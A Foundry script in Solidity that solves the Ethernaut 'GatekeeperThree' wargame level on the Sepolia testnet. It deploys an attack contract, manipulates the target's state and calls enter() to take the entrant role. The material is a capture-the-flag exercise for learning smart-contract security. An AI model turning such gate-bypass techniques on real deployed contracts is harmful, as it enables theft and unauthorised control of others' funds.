// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked28_GatekeeperThree.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked28_GatekeeperThreeScript --broadcast
contract Cracked28_GatekeeperThreeScript is Script {
    address payable ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = payable(vm.parseAddress(vm.envString("GatekeeperThree_address")));
    }

    function run() public {
        address player = vm.parseAddress(vm.envString("player"));
        vm.startBroadcast(player);
        console.log("IGatekeeperTwo(ethernaut_contracts).entrant() is", GatekeeperThree(ethernaut_contracts).entrant());
        Cracked28_GatekeeperThree attack = new Cracked28_GatekeeperThree(ethernaut_contracts);

        // bool success = payable(ethernaut_contracts).send(0.0011 ether);
        // require(success, "send FAIL");

        GatekeeperThree(ethernaut_contracts).createTrick();
        GatekeeperThree(ethernaut_contracts).getAllowance(block.timestamp);
        console.log("GatekeeperThree allowEntrance is ", GatekeeperThree(ethernaut_contracts).allowEntrance());
        console.log("GatekeeperThree owner is ", GatekeeperThree(ethernaut_contracts).owner());
        console.log("GatekeeperThree balance is ", ethernaut_contracts.balance);

        attack.enter();

        console.log("IGatekeeperTwo(ethernaut_contracts).entrant() is", GatekeeperThree(ethernaut_contracts).entrant());
        require(GatekeeperThree(ethernaut_contracts).entrant() == player, "FAIL");
        vm.stopBroadcast();
    }
}
